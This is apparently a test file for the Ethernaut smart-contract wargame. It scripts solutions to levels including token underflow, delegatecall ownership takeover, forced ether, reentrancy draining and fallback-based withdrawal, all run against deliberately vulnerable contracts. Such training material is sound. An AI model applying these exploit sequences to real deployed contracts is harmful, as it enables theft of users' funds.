/*eslint no-undef: "off"*/
const Ethernaut = artifacts.require('./Ethernaut.sol')
const DelegationFactory = artifacts.require('./levels/DelegationFactory.sol')
const Delegation = artifacts.require('./levels/Delegation.sol')
const TokenFactory = artifacts.require('./levels/TokenFactory.sol')
const Token = artifacts.require('./levels/Token.sol')
const Reentrance = artifacts.require('./levels/Reentrance.sol')
const ReentranceFactory = artifacts.require('./levels/ReentranceFactory.sol')
const ReentranceAttack = artifacts.require('./attacks/ReentranceAttack.sol')
const ForceFactory = artifacts.require('./levels/ForceFactory.sol')
const ForceAttack = artifacts.require('./attacks/ForceAttack.sol')
const Force = artifacts.require('./levels/Force.sol')
const InstanceFactory = artifacts.require('./levels/InstanceFactory.sol')
const Instance = artifacts.require('./attacks/Instance.sol')
const FallbackFactory = artifacts.require('./levels/FallbackFactory.sol')
const Fallback = artifacts.require('./attacks/Fallback.sol')
const FalloutFactory = artifacts.require('./levels/FalloutFactory.sol')
const Fallout = artifacts.require('./attacks/Fallout.sol')
import * as utils from './utils/TestUtils'

contract('Ethernaut', function(accounts) {

  let ethernaut
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
  });

  // ----------------------------------
  // Token
  // ----------------------------------

  describe('Token', function() {

    let level

    before(async function() {
      level = await TokenFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Token);

      // Check init balances
      let balance = (await instance.balanceOf(player)).toNumber();
      console.log(`init player balance: ${balance}`)
      assert.equal(balance, 20)
      const supply = (await instance.totalSupply.call()).toNumber();
      console.log(`token supply: ${supply}`)
      assert.equal(supply, 21000000)

      // Check transfer
      await instance.transfer(accounts[2], 1, {from: player})
      balance = (await instance.balanceOf(player)).toNumber();
      console.log(`player balance: ${balance}`)
      assert.equal(balance, 19)

      // Overflow
      await instance.transfer(accounts[2], 20, {from: player})
      balance = (await instance.balanceOf(player)).toNumber();
      console.log(`player balance: ${balance}`)
      assert.equal(balance, 1.157920892373162e+77)

      // Check win.
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });

  // ----------------------------------
  // Delegation
  // ----------------------------------

  describe('Delegation', function() {

    let level

    before(async function() {
      level = await DelegationFactory.new()
      await ethernaut.registerLevel(level.address)

    })

    it('should allow the player to solve the level', async function() {

      // Get instance, which should be owned by the level
      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Delegation);
      console.log(`player:`, player)
      console.log(`factory:`, level.address)
      let owner = await instance.owner.call()
      console.log(`instance owner:`, level.address)
      assert.equal(owner, level.address)

      // Use the fallback method to call the delegate's pwn()
      const pwner = web3.sha3("pwn()").substring(0, 10)
      await web3.eth.sendTransaction({
        from: player,
        to: instance.address,
        data: pwner
      }, (err, res) => {})

      // Player should own the instance now
      owner = await instance.owner.call()
      console.log(`new instance owner:`, owner)
      assert.equal(owner, player)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });
  });

  // ----------------------------------
  // Force
  // ----------------------------------

  describe('Force', function() {

    let level

    before(async function() {
      level = await ForceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Force);

      // Check init balances
      let balance = await utils.getBalance(web3, instance.address)
      console.log(`init instance balance: ${balance}`)
      assert.equal(balance, 0)

      // Sending funds should not work
      await web3.eth.sendTransaction({
        from: player,
        to: instance.address,
        value: web3.toWei(0.01, 'ether')
      }, async function() {

        balance = await utils.getBalance(web3, instance.address)
        console.log(`instance balance: ${balance}`)
        assert.equal(balance, 0)

        // Attack
        const attacker = await ForceAttack.new({
          from: player,
          value: web3.toWei(0.01, 'ether')
        })
        await attacker.attack(instance.address)

        // Check init balances
        balance = await utils.getBalance(web3, instance.address)
        console.log(`post instance balance: ${balance}`)
        assert.notEqual(balance, 0)

        // Check win.
        const ethCompleted = await utils.submitLevelInstance(
          ethernaut,
          level.address,
          instance.address,
          player
        )
        assert.equal(ethCompleted, true)

      })
    });
  });

  // ----------------------------------
  // Re-entrancy
  // ----------------------------------

  describe('Re-entrancy', function() {

    let level

    before(async function() {
      level = await ReentranceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const insertCoin = web3.fromWei(
        (await level.insertCoin.call()).toNumber(), 'ether'
      )
      console.log(`level insertCoin:`, insertCoin)

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Reentrance,
        {from: player, value: web3.toWei(insertCoin, 'ether')}
      )

      // Query contract balance (should be 0.1)
      let instanceBalance = await utils.getBalance(web3, instance.address)
      console.log(`init instance balance:`, instanceBalance)
      assert.equal(instanceBalance, insertCoin)

      // Deploy attacker contract
      const attackerFunds = 0.01
      const attacker = await ReentranceAttack.new(instance.address, {
        value: web3.toWei(attackerFunds, 'ether')
      })

      // Check attacker balance
      let attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`init attacker balance:`, attackerBalance)
      assert.equal(attackerBalance, attackerFunds)

      // '(◣_◢)'
      await attacker.attack_1_causeOverflow()
      attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`post attacker balance 1:`, attackerBalance)
      await attacker.attack_2_deplete()
      attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`post attacker balance 2:`, attackerBalance)

      // Query balance
      instanceBalance = await utils.getBalance(web3, instance.address)
      console.log(`post instance balance:`, instanceBalance)
      assert.equal(instanceBalance, 0)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // Re-entrancy
  // ----------------------------------

  describe('Instance', function() {

    let level

    before(async function() {
      level = await InstanceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Instance,
        {from: player}
      )

      const password = await instance.password.call()
      await instance.authenticate(password)
      const clear = await instance.getCleared()
      assert.equal(clear, true)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // Fallback
  // ----------------------------------

  describe('Fallback', function() {

    let level

    before(async function() {
      level = await FallbackFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Fallback,
        {from: player}
      )

      assert.equal(await instance.owner(), level.address)
      assert.equal(web3.toWei(1000, 'ether'), (await instance.getContribution({from: level.address})).toNumber())

      await instance.contribute({from: player, value: web3.toWei(0.0001, 'ether')})
      assert.notEqual(0, (await instance.getContribution({from: player})).toNumber())
      assert.notEqual(0, await utils.getBalance(web3, instance.address))

      web3.eth.sendTransaction({from: player, to: instance.address, value: web3.toWei(0.001, 'ether')}, async function(err, res) {
        assert.equal(player, await instance.owner())

        await instance.withdraw({from: player})
        assert.equal(0, await utils.getBalance(web3, instance.address))

        // Factory check
        const ethCompleted = await utils.submitLevelInstance(
          ethernaut,
          level.address,
          instance.address,
          player
        )
        assert.equal(ethCompleted, true)
      })
    });
  });

  // ----------------------------------
  // Fallout
  // ----------------------------------

  describe('Fallout', function() {

    let level

    before(async function() {
      level = await FalloutFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Fallout,
        {from: player}
      )

      assert.equal(await instance.owner(), level.address)

      await instance.Fal1out()
      assert.equal(await instance.owner(), player)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });
});